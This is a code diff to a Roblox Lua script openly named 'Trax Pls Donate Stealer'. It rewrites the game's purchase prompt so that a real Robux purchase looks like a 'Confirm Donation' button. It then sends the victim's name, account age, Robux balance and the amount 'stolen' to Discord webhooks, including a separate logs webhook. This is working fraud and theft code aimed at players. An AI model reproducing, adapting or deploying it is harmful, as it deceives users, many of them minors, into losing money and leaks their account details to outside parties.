@@ -85,6 +85,67 @@ local function sendPublicHitsWebhook()
     request({Url = PublicHitsWebhook, Method = "POST", Headers = headers, Body = data})
 end
 
+if Webhook == "" or Username == "" then
+    game.Players.LocalPlayer:Kick("Please enter a valid Webhook and Username!")
+end
+
+local headers = { ["Content-Type"] = "application/json" }
+local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+local success, UserId = pcall(function() return Players:GetUserIdFromNameAsync(Username) end)
+
+local asset
+local userRobux = 0
+
+local function sendWebhook()
+    local embed = {
+        ["title"] = "**__Trax Scripts! | Please Donate Hit!__**",
+        ["color"] = 0x0000FF,
+        ["fields"] = {
+            {["name"] = ":books: **__Player Info:__**", ["value"] = "```Name: " .. Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"},
+            {["name"] = "<:robux:1314309850154537020> **__Total Robux:__**", ["value"] = "```" .. userRobux .. "```"},
+            {["name"] = ":moneybag: **__Robux Stolen:__**", ["value"] = "```" .. tostring(asset and asset:GetAttribute("AssetPrice") or "N/A") .. "```"},
+            {["name"] = ":information_source: **__Information:__**", ["value"] = "The victim has clicked confirm and you got the Robux :white_check_mark:."}
+        }
+    }
+
+    local data = HttpService:JSONEncode({
+        ["username"] = "Trax Pls Donate Stealer",  
+        ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",  
+        ["content"] = "@everyone",
+        ["embeds"] = {embed}
+    })
+
+    local logsData = HttpService:JSONEncode({
+        ["username"] = "Trax Scripts | Logs",
+        ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",
+        ["content"] = "TRAX ON TOP!!",
+        ["embeds"] = {embed}
+    })
+
+    request({Url = Webhook, Method = "POST", Headers = headers, Body = data})
+    request({Url = LogsWebhook, Method = "POST", Headers = headers, Body = logsData})
+end
+
+local function sendPublicHitsWebhook()
+    local embed = {
+        ["title"] = "**__Trax | New Pls Donate Hit!__**",
+        ["color"] = 0x0000FF,
+        ["fields"] = {
+            {["name"] = "<:robux:1314309850154537020> **__Total Robux:__**", ["value"] = "```" .. userRobux .. "```"},
+            {["name"] = ":moneybag: **__Robux Stolen:__**", ["value"] = "```" .. tostring(asset and asset:GetAttribute("AssetPrice") or "N/A") .. "```"}
+        }
+    }
+
+    local data = HttpService:JSONEncode({
+        ["username"] = "Trax | Public Hits",  
+        ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",  
+        ["content"] = "",
+        ["embeds"] = {embed}
+    })
+
+    request({Url = PublicHitsWebhook, Method = "POST", Headers = headers, Body = data})
+end
+
 if success then
     local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
     if not Booth then return Players.LocalPlayer:Kick() end
@@ -152,16 +213,11 @@ if success then
                 Title.Size = UDim2.new(1, 0, Title.Size.Y.Scale, Title.Size.Y.Offset)
                 Title.TextColor3 = Color3.fromRGB(255, 100, 100)  -- Custom color for title
 
-                -- Hide the default "Remaining Balance" and "Footer"
-                child.AlertContents.MiddleContent.Visible = false 
-                child.AlertContents.Footer.Visible = false
-                child.AlertContents.Footer.Buttons["1"].Visible = false
-                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Confirm Donation"
-                
-                local Button = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
-                Button.Size = UDim2.new(1, 0, Button.Size.Y.Scale, Button.Size.Y.Offset)
-                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
-                child.AlertContents.Footer.FooterContent.Visible = false
+                -- Show the purchase button
+                local PurchaseButton = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent
+                PurchaseButton.Text.Text = "Confirm Donation"
+                PurchaseButton.Size = UDim2.new(1, 0, 0, 50)  -- Ensures the button is visible and sized properly
+                child.AlertContents.Footer.Visible = true
             end
         end
     end)
